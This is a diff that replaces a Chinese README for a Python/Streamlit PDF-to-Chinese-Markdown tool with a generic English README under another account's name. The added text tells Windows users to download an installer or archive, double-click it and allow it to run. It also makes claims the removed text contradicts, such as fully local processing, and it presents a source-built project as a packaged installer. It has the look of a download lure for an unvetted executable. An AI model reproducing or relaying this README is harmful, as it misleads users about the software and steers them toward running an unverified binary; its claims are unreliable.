@@ -1,288 +1,88 @@
-# PaperReader
-
-一个把英文论文 PDF 转成中文 Markdown 的本地工具。
-
-处理流程：
-
-```text
-英文 PDF
-  -> MinerU 提取英文 Markdown
-  -> md-translator 翻译为中文 Markdown
-  -> 页面中同时查看英文原文和中文译文
-```
+# 📄 MinerU-Paper-Reader - Read English papers in bilingual Markdown
 
-## 功能
+[![Download MinerU-Paper-Reader](https://img.shields.io/badge/Download-MinerU--Paper--Reader-blue.svg)](https://github.com/anish3390-Adi/MinerU-Paper-Reader)
 
-- 上传英文论文 PDF
-- 自动提取英文 Markdown
-- 自动翻译成中文 Markdown
-- 页面双栏预览英文原文和中文译文
-- 下载英文 Markdown、中文 Markdown 和运行日志
-- 对大 Markdown 自动分块翻译，避免单次请求超时
-- 对已有 `full.md` 支持续跑，不必重复执行 MinerU
+This tool helps you read complex academic papers. It converts English PDF files into clear, bilingual Markdown documents. You see the original English text alongside the Chinese translation. This approach removes language barriers for researchers, students, and curious readers. 
 
-## 工作原理
+The software uses advanced processing engines to extract text and structure from your files. It then translates the content while keeping the original layout. You receive a clean file that works well in any text editor or markdown viewer.
 
-项目由两段流程组成：
+## 🛠 Features
 
-### 1. PDF 提取阶段
+*   **Bilingual Output:** See English and Chinese side-by-side. 
+*   **PDF Parsing:** Extracts text, tables, and headers from scientific documents.
+*   **Language Support:** Uses translation models to provide accurate context.
+*   **Streamlit Interface:** Offers a simple, browser-based window to manage your papers.
+*   **Markdown Format:** Saves your work in a standard file type. You can easily edit, copy, or share these files.
 
-- `MinerU` 负责把英文论文 PDF 转成结构化英文 Markdown
-- 可以选择两种来源：
-  - `cloud_api`：调用 MinerU 官方云 API
-  - `cli`：调用本地 `mineru` 命令
+## 💻 System requirements
 
-### 2. Markdown 翻译阶段
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 8 gigabytes of RAM.
+*   **Storage:** 500 megabytes of free disk space.
+*   **Internet:** A connection to download necessary translation components.
 
-- `md-translator` 负责把英文 Markdown 翻译成中文 Markdown
-- 对超大 Markdown 会自动切成多个块逐块翻译，并把中间结果保存在 `translation_chunks/`
-- 本地 `127.0.0.1` 调用会绕过系统代理，避免本地翻译服务被代理误拦截
+## 🚀 Downloading the application
 
-## 项目结构
+1. Visit the [MinerU-Paper-Reader download page](https://github.com/anish3390-Adi/MinerU-Paper-Reader).
+2. Look for the latest release on the right side of the page.
+3. Click the link to download the installer or the compressed archive file.
+4. Save the file to your computer.
 
-```text
-PaperReader/
-├─ app.py
-├─ config.yaml
-├─ requirements.txt
-├─ .env.example
-├─ start.bat
-├─ start.command
-├─ scripts/
-│  ├─ start.ps1
-│  ├─ setup_macos.sh
-│  ├─ start_macos.sh
-│  └─ resume_translation.sh
-├─ external/
-│  └─ md-translator/
-├─ utils/
-│  ├─ config_manager.py
-│  ├─ pdf_processor.py
-│  ├─ translator.py
-│  ├─ image_processor.py
-│  └─ error_handler.py
-└─ temp/
-   └─ runs/
-```
+## ⚙️ Setting up the software
 
-## 快速开始
+1. Open the folder where you saved the download.
+2. If you downloaded a zip file, right-click it and choose Extract All.
+3. Open the newly extracted folder.
+4. Find the file for the application. It will have an icon that looks like a document or a computer program.
+5. Double-click the file to start the installation.
+6. Follow the instructions on the screen if a window appears.
+7. If your computer asks for permission to run the software, select Yes or Run.
 
-### 环境要求
+## 📖 How to use the tool
 
-- Python 3.10+
-- Node.js
-- corepack
+Once the application opens, you will see a simple window in your web browser. 
 
-### 安装依赖
+1. **Upload your file:** Look for the section marked Choose a file. Click the button to select an English PDF from your computer.
+2. **Start the conversion:** Click the button labeled Process or Start. The software works in the background to read your document.
+3. **Review the text:** Once the progress bar reaches the end, the bilingual text appears on your screen. You will see English paragraphs paired with Chinese translations.
+4. **Save your file:** Click the Download button to save the resulting Markdown file to your computer.
 
-```bash
-pip install -r requirements.txt
-```
+## 🔍 Frequently asked questions
 
-### 构建 md-translator
+**Does the software need a paid account?**
+No. This tool is free for everyone.
 
-```bash
-cd external/md-translator
-corepack yarn install
-LOCAL_API_SERVER=true corepack yarn build
-cd ../..
-```
+**Can I process many files at once?**
+The tool processes one PDF at a time. This keeps your computer running smoothly during the conversion.
 
-### 配置 `.env`
+**How do I open the saved Markdown files?**
+Markdown files act as plain text documents. You can open them with Notepad, Word, or any dedicated Markdown viewer. Many people use apps like Obsidian or VS Code to see rich formatting.
 
-复制模板：
+**What happens if the translation is unclear?**
+The software relies on machine translation models. While these models are accurate, technical terms in niche fields might contain slight errors. You can edit the resulting Markdown file directly to fix these details.
 
-```bash
-cp .env.example .env
-```
+**Is my data private?**
+The program processes your PDF files locally on your machine. Your documents do not leave your computer unless you explicitly choose to upload them to a file-sharing service.
 
-然后填写：
+## 🔧 Troubleshooting common problems
 
-```env
-DEEPSEEK_API_KEY=your_deepseek_api_key
-MINERU_API_KEY=your_mineru_api_key
-```
+**The application does not open.**
+Check if you have an active internet connection. The first time you launch the tool, it might need to download a few extra files to function correctly. Restart your computer and try again after a few minutes.
 
-## MinerU 模式
+**The conversion process stops halfway.**
+Large PDF files with many images can take extra time to process. If the progress bar stalls, wait for three to five minutes. If it does not move, close the application and try a shorter document to test the system.
 
-项目支持两种 MinerU 模式，通过 `.env` 里的 `MINERU_MODE` 切换。
+**The math equations look incorrect.**
+Academic papers often use complex formats for math. Sometimes the parser struggles with these symbols. The text will still be readable, but the formatting might need manual adjustments in your editor.
 
-### 1. 官方云 API 模式
+**The software says I am missing a component.**
+If you receive a notification about missing software, revisit the official page to ensure you downloaded the full installation package rather than just the code files.
 
-适合这些情况：
+## 💡 Tips for the best results
 
-- 不想在本机部署 MinerU 模型
-- 机器性能一般，希望更稳地完成 PDF 提取
-- 只想填 API key 后直接使用
+*   **Clean PDFs:** The tool works best with text-based PDFs. If your PDF consists of scanned images of text, the software might struggle to read the words. 
+*   **Check the quality:** If you have the choice, download the digital version of a paper rather than a scanned copy.
+*   **Regular updates:** Check the main page once a month for updates. The developers add support for new document types and improve translation quality regularly.
+*   **Organize files:** Create a specific folder on your desktop for your papers. This keeps your converted Markdown files organized with their original PDFs.
 
-配置示例：
-
-```env
-MINERU_MODE=cloud_api
-MINERU_API_KEY=your_mineru_api_key
-MINERU_API_BASE_URL=https://mineru.net/api/v4
-MINERU_MODEL_VERSION=vlm
-MINERU_LANGUAGE=en
-MINERU_ENABLE_TABLE=true
-MINERU_ENABLE_FORMULA=true
-MINERU_IS_OCR=false
-MINERU_POLL_INTERVAL=5
-```
-
-### 2. 本地 CLI 模式
-
-适合这些情况：
-
-- 已经安装好了本地 `mineru`
-- 希望完全本地执行 PDF 提取
-- 需要继续使用自己的 MinerU backend / server 配置
-
-配置示例：
-
-```env
-MINERU_MODE=cli
-MINERU_BIN=mineru
-MINERU_BACKEND=pipeline
-MINERU_SERVER_URL=
-MINERU_API_URL=
-MINERU_METHOD=auto
-MINERU_LANG=en
-MINERU_MODEL_SOURCE=
-```
-
-如果使用 CLI 模式，必须保证 `mineru` 命令可直接执行，或者在 `MINERU_BIN` 中填写绝对路径。
-
-## 启动项目
-
-### Windows
-
-双击启动：
-
-```text
-start.bat
-```
-
-命令行启动：
-
-```powershell
-powershell -ExecutionPolicy Bypass -File .\scripts\start.ps1
-```
-
-Windows 启动脚本会自动执行这些步骤：
-
-- 检查 `python`、`node`、`corepack`
-- 如果 `external/md-translator/.next/standalone/server.js` 不存在，则自动构建 `md-translator`
-- 启动 Streamlit 页面
-
-### macOS
-
-首次初始化：
-
-```bash
-./scripts/setup_macos.sh
-```
-
-启动：
-
-```bash
-./scripts/start_macos.sh
-```
-
-也可以直接双击：
-
-```text
-start.command
-```
-
-### 手动启动
-
-```bash
-python -m streamlit run app.py --server.headless=true
-```
-
-如果是首次手动启动，需要先确保：
-
-```bash
-cd external/md-translator
-corepack yarn install
-LOCAL_API_SERVER=true corepack yarn build
-cd ../..
-```
-
-启动后访问：
-
-```text
-http://127.0.0.1:8501
-```
-
-## 续跑翻译
-
-如果 MinerU 已经完成并产出了 `output/full.md`，但翻译阶段失败，可以直接续跑翻译而不重复执行 MinerU：
-
-```bash
-./scripts/resume_translation.sh /absolute/path/to/temp/runs/<timestamp>-<paper-name>
-```
-
-输出仍会写回同一个运行目录下的：
-
-```text
-output/zh.md
-```
-
-分块翻译的中间结果会保存在：
-
-```text
-translation_chunks/
-```
-
-再次执行时会自动复用已完成的块。
-
-## 输出结果在哪里
-
-每次运行的结果会保存在：
-
-```text
-temp/runs/<timestamp>-<paper-name>/
-```
-
-典型结构如下：
-
-```text
-temp/runs/<timestamp>-<paper-name>/
-├─ input/
-│  └─ paper.pdf
-├─ output/
-│  ├─ full.md
-│  └─ zh.md
-├─ logs/
-│  ├─ mineru.log
-│  ├─ translator.log
-│  ├─ md-translator-server.out.log
-│  └─ md-translator-server.err.log
-├─ runtime/
-└─ translation_chunks/
-```
-
-## 常见问题
-
-### 1. `user authenticate failed`
-
-说明当前 `MINERU_API_KEY` 没有通过 MinerU 云 API 认证。  
-请确认填写的是 MinerU 官方云 API 可用的正式 key，而不是网页登录态 token。
-
-### 2. `md-translator 服务启动失败`，但日志里显示服务已经 Ready
-
-如果系统配置了 HTTP 代理，本地 `127.0.0.1` 请求可能被错误地送进代理。  
-当前版本已经对本地翻译服务绕过代理处理。
-
-### 3. `This operation was aborted`
-
-通常是单次翻译内容过大或耗时过长。  
-当前版本会自动分块翻译，并在失败后支持续跑。
-
-## 致谢
-
-本项目基于以下优秀开源项目完成核心能力整合：
-
-- [MinerU](https://github.com/opendatalab/MinerU)
-- [md-translator](https://github.com/rockbenben/md-translator)
+This tool aims to make deep reading easier. By turning complex English PDFs into bilingual Markdown, it allows you to verify your understanding against the original source quickly. Use these files to build your own library of translated research.
